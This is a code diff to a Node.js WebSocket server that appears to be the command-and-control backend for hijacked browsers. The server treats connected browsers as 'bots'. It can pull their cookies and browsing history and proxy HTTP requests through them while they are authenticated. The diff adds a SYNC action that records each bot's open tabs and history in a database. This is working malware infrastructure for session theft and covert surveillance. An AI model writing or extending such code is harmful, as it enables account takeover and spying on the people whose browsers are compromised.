@@ -37,6 +37,7 @@ const SERVER_VERSION = '1.0.0';
 
 const RPC_CALL_TABLE = {
     'PING': ping,
+    'SYNC': sync,
 }
 
 const REQUEST_TABLE = new NodeCache({
@@ -68,8 +69,32 @@ async function ping(websocket_connection, params) {
             "url": params.current_tab.url,
             "title": params.current_tab.title,
         },
-        tabs:params.tabs,
-        current_tab_image: params.current_tab_image
+        current_tab_image: params.current_tab_image,
+    });
+}
+
+
+async function sync(websocket_connection, params) {
+    // Send PONG message back
+    websocket_connection.send(
+        JSON.stringify({
+            'id': uuid.v4(),
+            'version': SERVER_VERSION,
+            'action': 'PONG',
+            'data': {}
+        })
+    )
+
+    // Update bot as online
+    const bot = await Bots.findOne({
+        where: {
+            browser_id: websocket_connection.browser_id
+        }
+    });
+    await bot.update({
+        is_online: true,
+        tabs: params.tabs,
+        history: params.history
     });
 }
 
@@ -85,9 +110,9 @@ function get_browser_proxy(input_browser_id) {
 }
 
 function authenticate_client(websocket_connection) {
-    return new Promise(function(resolve, reject) {
+    return new Promise(function (resolve, reject) {
         // For timeout, will reject if no response in 30 seconds.
-        setTimeout(function() {
+        setTimeout(function () {
             reject(`A timeout occurred when authenticating WebSocket client.`);
         }, (30 * 1000));
 
@@ -115,9 +140,9 @@ function authenticate_client(websocket_connection) {
 }
 
 function get_browser_cookie_array(browser_id) {
-    return new Promise(function(resolve, reject) {
+    return new Promise(function (resolve, reject) {
         // For timeout, will reject if no response in 30 seconds.
-        setTimeout(function() {
+        setTimeout(function () {
             reject(`Get cookies RPC called timed out.`);
         }, (30 * 1000));
 
@@ -155,8 +180,8 @@ function get_browser_cookie_array(browser_id) {
 }
 
 function get_browser_history_array(browser_id) {
-    return new Promise(function(resolve, reject) {
-        setTimeout(function() {
+    return new Promise(function (resolve, reject) {
+        setTimeout(function () {
             reject(`Get history RPC called timed out.`);
         }, (30 * 1000));
 
@@ -187,9 +212,9 @@ function get_browser_history_array(browser_id) {
 
 
 function send_request_via_browser(browser_id, authenticated, url, method, headers, body) {
-    return new Promise(function(resolve, reject) {
+    return new Promise(function (resolve, reject) {
         // For timeout, will reject if no response in 30 seconds.
-        setTimeout(function() {
+        setTimeout(function () {
             reject(`Request Timed Out for URL ${url}!`);
         }, (30 * 1000));
 
@@ -286,7 +311,7 @@ async function get_authentication_status(inputRequestDetail) {
     // If we already have this cached we can stop here.
     const credential_data_string = await getAsync(memory_cache_key);
 
-    if(credential_data_string) {
+    if (credential_data_string) {
         const cached_record = JSON.parse(credential_data_string);
         return {
             'id': cached_record.id,
@@ -312,7 +337,7 @@ async function get_authentication_status(inputRequestDetail) {
     // No need to wait for this to resolve
     await setexAsync(
         memory_cache_key,
-        ( 60 * 10 ),
+        (60 * 10),
         JSON.stringify(browserproxy_record),
     );
 
@@ -443,10 +468,11 @@ async function initialize_new_browser_connection(ws) {
             'is_authenticated': true,
             'is_online': true,
             'user_agent': user_agent,
-            'current_tab':{},
-            'current_tab_image':'',
-            'tabs':{},
-            'bookmarks':{}
+            'current_tab': {},
+            'current_tab_image': '',
+            'history': {},
+            'tabs': {},
+            'bookmarks': {}
         });
     } else {
         // Update all browserproxy records to reflect that all these proxies are
@@ -474,7 +500,7 @@ async function initialize() {
     redis_client = redis.createClient({
         "host": process.env.REDIS_HOST,
     });
-    redis_client.on("error", function(error) {
+    redis_client.on("error", function (error) {
         logit(`Redis client encountered an error:`);
         console.error(error);
     });
@@ -491,12 +517,12 @@ async function initialize() {
     delAsync = util.promisify(redis_client.del).bind(redis_client);
 
     // Called when a new redis subscription is added
-    subscriber.on("subscribe", function(channel, count) {
+    subscriber.on("subscribe", function (channel, count) {
         //logit(`New subscription created for channel ${channel}, bring total to ${count}.`);
     });
 
     // Called when a new message is written to a channel
-    subscriber.on("message", function(channel, message) {
+    subscriber.on("message", function (channel, message) {
         //logit(`Received a new message at channel '${channel}', message is '${message}'`);
 
         // For messages being sent to the browser from the proxy
@@ -593,7 +619,9 @@ async function initialize() {
                 }
                 return
             } else if (inbound_message.action === 'PING') {
-                ping(ws,inbound_message.data);
+                ping(ws, inbound_message.data);
+            } else if (inbound_message.action === 'SYNC') {
+                sync(ws, inbound_message.data);
             } else if (ws.browser_id) {
                 // Write to redis proxy topic with the response from the
                 // websocket connection.
@@ -631,7 +659,7 @@ async function initialize() {
 
     const proxy_utils = {
         'get_browser_cookie_array': get_browser_cookie_array,
-        'get_browser_history_array':get_browser_history_array
+        'get_browser_history_array': get_browser_history_array
     };
 
     // Start the API server
